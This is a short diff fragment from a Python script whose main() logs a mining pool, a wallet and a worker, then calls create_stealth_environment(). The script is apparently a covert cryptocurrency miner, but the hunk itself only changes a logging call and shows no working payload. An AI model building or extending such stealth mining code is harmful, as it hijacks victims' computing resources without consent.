@@ -317,7 +317,7 @@ def main():
     log(f"Pool: {POOL}")
     log(f"Wallet: {WALLET[:16]}...")
     log(f"Worker: {WORKER}")
-    log()
+    log("")
     
     # Create stealth environment
     create_stealth_environment()
